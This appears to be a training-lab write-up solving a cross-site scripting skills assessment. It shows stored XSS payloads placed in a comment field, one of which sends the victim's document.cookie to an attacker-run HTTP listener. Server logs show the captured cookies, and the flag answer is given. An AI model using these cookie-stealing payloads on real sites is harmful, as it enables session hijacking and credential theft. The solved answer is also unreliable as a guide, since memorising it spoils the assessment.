# Section 10: Skills Assessment

Module: 19. Cross-Site Scripting (XSS)

---

## Questions & Answers

### 1. What is the value of the 'flag' cookie?

Context:
- Firstly, we have to find the vulnerability, I checked the search box, it has encoded the `<>`:
```html
Results for &quot;<span class="page-description search-term">&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;</span>&quot;
```
- So I moved to the comment functionality, using the method used in Hijacking exercise:
```html
"><script src='http://10.10.15.273:8080/<FIELD>'></script>
```
```bash
┌─[eu-academy-2]─[10.10.15.173]─[htb-ac-2162140@htb-tsgfrvwojz-htb-cloud-com]─[~]
└──╼ [★]$ sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.203.218 - - [10/Sep/2026 09:01:13] code 404, message File not found
10.129.203.218 - - [10/Sep/2026 09:01:13] "GET /Website HTTP/1.1" 404 -
```
- The vulnerable is in the website input, construct the payload to get the admin cookie and flag:
```html
"><script>new Image().src='http://10.10.15.173:8080/catch?c='+document.cookie;</script>
```
```bash
┌─[eu-academy-2]─[10.10.15.173]─[htb-ac-2162140@htb-tsgfrvwojz-htb-cloud-com]─[~]
└──╼ [★]$ sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.203.218 - - [10/Sep/2026 09:04:41] code 404, message File not found
10.129.203.218 - - [10/Sep/2026 09:04:41] "GET /catch?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1789045480;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4} HTTP/1.1" 404 -
```

**Answer:** `HTB{cr055_5173_5cr1p71n6_n1nj4}`

---

[Back to Module Index](./README.md)
